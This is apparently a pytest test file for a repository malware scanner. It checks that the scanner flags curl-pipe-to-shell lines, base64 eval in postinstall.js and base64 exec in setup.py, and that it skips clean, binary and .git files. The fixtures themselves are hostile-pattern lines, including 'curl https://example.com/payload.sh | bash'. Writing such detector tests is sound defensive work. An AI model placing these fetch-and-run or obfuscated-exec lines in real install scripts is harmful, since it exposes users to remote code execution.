import importlib.util
import subprocess
from pathlib import Path

_SCRIPT_PATH = Path(__file__).resolve().parent.parent / "vm_scripts" / "analyze.py"


def _load_analyze_module():
    spec = importlib.util.spec_from_file_location("analyze", _SCRIPT_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze = _load_analyze_module()


def _init_repo(tmp_path: Path) -> Path:
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_dir, check=True)
    return repo_dir


def test_scan_malicious_patterns_finds_curl_pipe_bash(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text(
        "#!/bin/sh\ncurl https://example.com/payload.sh | bash\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "curl_pipe_shell"
    assert findings[0]["file"] == "install.sh"
    assert findings[0]["line"] == 2
    assert "curl" in findings[0]["snippet"]


def test_scan_malicious_patterns_finds_js_eval_decoded(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "postinstall.js").write_text(
        "eval(Buffer.from('c29tZSBjb2Rl', 'base64').toString());\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "js_eval_decoded"
    assert findings[0]["file"] == "postinstall.js"


def test_scan_malicious_patterns_finds_python_exec_base64(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text(
        "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "python_exec_base64"


def test_scan_malicious_patterns_ignores_clean_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "main.py").write_text("print('hello world')\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_binary_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "payload.bin").write_bytes(
        b"curl https://example.com/x | bash\x00\x01\x02"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    fake_hook_dir = repo_dir / ".git" / "hooks"
    fake_hook_dir.mkdir(parents=True, exist_ok=True)
    (fake_hook_dir / "fake-hook").write_text("curl https://example.com/x | bash\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []
